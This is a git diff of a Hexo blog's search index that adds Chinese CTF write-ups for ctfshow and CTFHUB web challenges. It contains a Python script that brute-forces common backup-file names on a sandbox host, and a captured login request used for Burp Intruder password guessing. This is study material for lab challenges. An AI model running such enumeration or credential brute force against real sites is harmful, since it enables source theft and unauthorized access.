+<p>flag不在这，它不讲武德了啊，看来flag不在这，回去看PHP代码，里面有一个Include(“secret.php”);或许真的flag就在里面</p>
+</blockquote>
+<blockquote>
+<p>先访问一下 secret.php 文件, 可以正常访问, 没有报404, 说明这个文件确实存在, 而且就在根目录下, apache的默认网站根路径是 &#x2F;var&#x2F;www&#x2F;html, 我们试一下读这个文件的内容</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_10.png" alt="ctfshow_web14_10"></p>
+<blockquote>
+<p>发现提示&#x2F;real_flag_is_here,查看地址，发现flag</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_11.png" alt="ctfshow_web14_11"></p>
+<h2 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h2><h3 id="WEB-请求方式"><a href="#WEB-请求方式" class="headerlink" title="WEB_请求方式"></a><strong>WEB_请求方式</strong></h3><hr>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png" alt="请求方式"></p>
+<hr>
+<p>用burpsuit抓包,重放，将GET改成<strong>CTFHUB</strong>，发送即可获得flag</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_1.png" alt="BURPSUIT"></p>
+<p>falg</p>
+<hr>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_2.png" alt="flag"></p>
+<hr>
+<h3 id="信息页面隐藏"><a href="#信息页面隐藏" class="headerlink" title="信息页面隐藏"></a>信息页面隐藏</h3><hr>
+<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_1.png" alt="CTFHUB_WEB_2_1" style="zoom: 80%;">
+
+<p>看见页面信息繁杂，flag可能就隐藏在页面中，火狐快捷键*<u><strong>Ctrl+f</strong></u>*快捷查找，输入flag找到FLAG。</p>
+<hr>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_2.png" alt="CTFHUB_WEB_2_2"></p>
+<hr>
+<h3 id="备份文件下载——网站源码"><a href="#备份文件下载——网站源码" class="headerlink" title="备份文件下载——网站源码"></a>备份文件下载——网站源码</h3><p><strong>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</strong></p>
+<hr>
+<blockquote>
+<h4 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h4><hr>
+<ul>
+<li>tar</li>
+<li>tar.gz</li>
+<li>zip</li>
+<li>rar</li>
+</ul>
+<h4 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h4><hr>
+<ul>
+<li>web</li>
+<li>website</li>
+<li>backup</li>
+<li>back</li>
+<li>www</li>
+<li>wwwroot</li>
+<li>temp</li>
+</ul>
+</blockquote>
+<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_1.png" alt="CTFHUB_WEB_3_1" style="zoom:50%;">
+
+<p>文件下载，用python脚本，requests</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line"></span><br><span class="line">li1=[<span class="string">&quot;web&quot;</span>,<span class="string">&quot;website&quot;</span>,<span class="string">&quot;backup&quot;</span>,<span class="string">&quot;back&quot;</span>,<span class="string">&quot;www&quot;</span>,<span class="string">&quot;wwwroot&quot;</span>,<span class="string">&quot;temp&quot;</span>]</span><br><span class="line">li2=[<span class="string">&quot; tar&quot;</span>,<span class="string">&quot;tar.gz&quot;</span>,<span class="string">&quot;zip&quot;</span>,<span class="string">&quot;rar&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url +<span class="string">&quot;/&quot;</span>+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Response [404]&gt;//1</span><br><span class="line">&lt;Response [404]&gt;//2</span><br><span class="line">&lt;Response [404]&gt;//3</span><br><span class="line">&lt;Response [404]&gt;//4</span><br><span class="line">&lt;Response [404]&gt;//5</span><br><span class="line">&lt;Response [404]&gt;//6</span><br><span class="line">&lt;Response [404]&gt;//7</span><br><span class="line">&lt;Response [404]&gt;//8</span><br><span class="line">&lt;Response [404]&gt;//9</span><br><span class="line">&lt;Response [404]&gt;//10</span><br><span class="line">&lt;Response [404]&gt;//11</span><br><span class="line">&lt;Response [404]&gt;//12</span><br><span class="line">&lt;Response [404]&gt;//13</span><br><span class="line">&lt;Response [404]&gt;//14</span><br><span class="line">&lt;Response [404]&gt;//15</span><br><span class="line">&lt;Response [404]&gt;//16</span><br><span class="line">&lt;Response [404]&gt;//17</span><br><span class="line">&lt;Response [404]&gt;//18</span><br><span class="line">&lt;Response [200]&gt;//[200]19</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>得到备份文件”<a class="link" href="http://www.zip/">www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“</p>
+<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEwww.zip%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%BE%97%E5%88%B0%E5%8E%8B%E7%BC%A9%E5%8C%85www.zip%EF%BC%8C%E8%A7%A3%E5%8E%8B%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A6%82%E5%9B%BE%EF%BC%9A">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip直接访问www.zip下载，得到压缩包www.zip，解压打开文件，如图： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_2.png" alt="CTFHUB_WEB_3_2"></p>
+<p>打开flag文件，发现没有flag</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_3.png" alt="CTFHUB_WEB_3_3"></p>
+<p>直接用</p>
+<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt%E5%BE%97%E5%88%B0flag">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt得到flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="Web-弱口令"><a href="#Web-弱口令" class="headerlink" title="Web_弱口令"></a>Web_弱口令</h2><blockquote>
+<p><strong>弱口令</strong></p>
+<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 </p>
+</blockquote>
+<p>使用<code>BurpSuite</code>中<code>Intruder</code>模块 ，即暴力破解模块(或在fuzz中使用)</p>
+<p>开启burp代理</p>
+<p>登录信息随便填，抓到request请求如下</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=admin&amp;password=ctfhub&amp;referer=</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_2.png" alt="CTFHUB_WEB_4_2"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_3.png" alt="CTFHUB_WEB_4_3"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_4.png" alt="CTFHUB_WEB_4_4"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_5.png" alt="CTFHUB_WEB_4_5"></p>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>CTF</tag>
+        <tag>ctf.show</tag>
       </tags>
   </entry>
   <entry>
@@ -2788,6 +2774,20 @@ over</p>
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>实战</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>敬请T期待</title>
+    <url>/2024/01/16/%E6%95%AC%E8%AF%B7T%E6%9C%9F%E5%BE%85/</url>
+    <content><![CDATA[<h1 id="HEXO"><a href="#HEXO" class="headerlink" title="HEXO"></a>HEXO</h1><h2 id="HELLO"><a href="#HELLO" class="headerlink" title="HELLO!"></a>HELLO!</h2><blockquote>
+<p>敬请T期待</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
+      <tags>
+        <tag>Begin</tag>
       </tags>
   </entry>
   <entry>
